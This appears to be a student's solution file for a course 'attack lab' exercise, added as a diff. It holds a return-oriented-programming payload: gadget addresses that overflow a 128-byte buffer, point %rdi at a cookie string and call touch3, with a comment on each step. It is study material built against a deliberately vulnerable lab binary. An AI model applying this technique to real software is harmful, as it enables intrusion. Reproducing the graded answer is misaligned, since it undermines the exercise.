@@ -1,0 +1,23 @@
+BUFSIZE = 128
+touch3 at 0x401da6
+GOAL:
+    %rdi -> 31 64 36 66 38 66 61 35 00,
+    call touch3
+
+7a 1f 40 00 00 00 00 00     # -> movq %rsp, %rax
+fc 1e 40 00 00 00 00 00     # -> movq %rax, %rdi    ; %rdi pointing here
+29 1f 40 00 00 00 00 00     # -> popq %rax
+48 00 00 00 00 00 00 00     # value: shift=72, %rax=shift
+1b 20 40 00 00 00 00 00
+bb 1f 40 00 00 00 00 00
+85 1f 40 00 00 00 00 00     # <=> movl %eax, %esi
+59 1f 40 00 00 00 00 00     # -> lea (%rdi,%rsi,1), %rax ; %rax = %rdi + shift
+fc 1e 40 00 00 00 00 00     # -> movq %rax, %rdi
+a6 1d 40 00 00 00 00 00     # -> touch3
+31 64 36 66 38 66 61 35     # value: cookie string
+00 00 00 00 00 00 00 00     # '\0', tab begin; current size: 12*8
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00     # current size: 128, overflowing...
+00 00 00 00 28 01 00 00     # tab 4B; len=0x128, shifting logMsg to returning %rsp to load rop
